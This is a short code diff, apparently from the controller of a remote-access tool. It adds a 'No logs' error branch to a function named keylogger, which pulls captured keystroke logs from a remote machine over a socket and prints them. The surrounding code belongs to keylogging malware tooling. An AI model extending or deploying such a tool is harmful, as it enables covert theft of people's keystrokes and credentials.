@@ -405,6 +405,9 @@ def keylogger(option):
         if intBuffer == "error":
             print("Keylogger is not running!")
             return
+        elif intBuffer == "error2":
+            print("No logs")
+            return
 
         strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
         print("\n" + strLogs)
